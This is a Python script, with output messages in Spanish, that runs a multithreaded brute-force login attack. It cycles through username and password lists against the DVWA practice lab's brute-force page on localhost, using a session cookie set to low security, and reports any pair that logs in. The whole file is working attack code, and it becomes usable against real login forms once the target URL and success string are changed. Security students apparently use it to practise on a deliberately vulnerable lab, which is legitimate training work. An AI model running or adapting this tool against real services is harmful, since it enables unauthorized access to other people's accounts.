import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def brute_force_attack(target_url, users, passwords, cookies=None, max_workers=5):
    valid_credentials = []
    session = requests.Session()
    

    if cookies:
        session.headers.update({'Cookie': cookies})
    
    def try_login(user, password):
        try:

            params = {
                'username': user,
                'password': password,
                'Login': 'Login'
            }
            

            response = session.get(target_url, params=params, timeout=5)
            

            if "Welcome to the password protected area" in response.text:
                return (user, password, True, len(response.content))
            else:
                return (user, password, False, len(response.content))
                
        except Exception as e:
            return (user, password, False, f"Error: {str(e)}")
    
    print(f"[+] Iniciando ataque de fuerza bruta...")
    print(f"[+] Target: {target_url}")
    print(f"[+] Usuarios a probar: {len(users)}")
    print(f"[+] Contraseñas a probar: {len(passwords)}")
    print(f"[+] Total de combinaciones: {len(users) * len(passwords)}")
    print("-" * 50)
    
    start_time = time.time()
    attempts = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_cred = {}
        
        for user in users:
            for password in passwords:
                future = executor.submit(try_login, user, password)
                future_to_cred[future] = (user, password)
        
        for future in as_completed(future_to_cred):
            user, password = future_to_cred[future]
            result = future.result()
            attempts += 1
            
            user, password, success, details = result
            
            if success:
                print(f"ENCONTRADO - Usuario: {user} | Contraseña: {password} | Longitud: {details} bytes")
                valid_credentials.append((user, password))
            else:
                if attempts % 10 == 0:  # Mostrar progreso cada 10 intentos
                    print(f"[{attempts}] Probando: {user}:{password}")
    
    end_time = time.time()
    print("-" * 50)
    print(f"[+] Ataque completado en {end_time - start_time:.2f} segundos")
    print(f"[+] Credenciales válidas encontradas: {len(valid_credentials)}")
    
    return valid_credentials

def main():

    target_url = "http://localhost:4280/vulnerabilities/brute/"
    cookies = "security=low; PHPSESSID=dcsokermvima2t9ji65sp3h1j1"
    

    users = [
        "admin",
        "pablo", 
        "smithy",
        "gordonb",
        "1337"
    ]
    
    passwords = [
        "password",
        "123456",
        "abc123",
        "monkey",
        "test"
    ]
    

    valid_creds = brute_force_attack(target_url, users, passwords, cookies, max_workers=8)
    
    if valid_creds:
        print("\nCREDENCIALES VÁLIDAS ENCONTRADAS:")
        for user, password in valid_creds:
            print(f"   Usuario: {user} | Contraseña: {password}")
    else:
        print("\nNo se encontraron credenciales válidas")

if __name__ == "__main__":
    main()
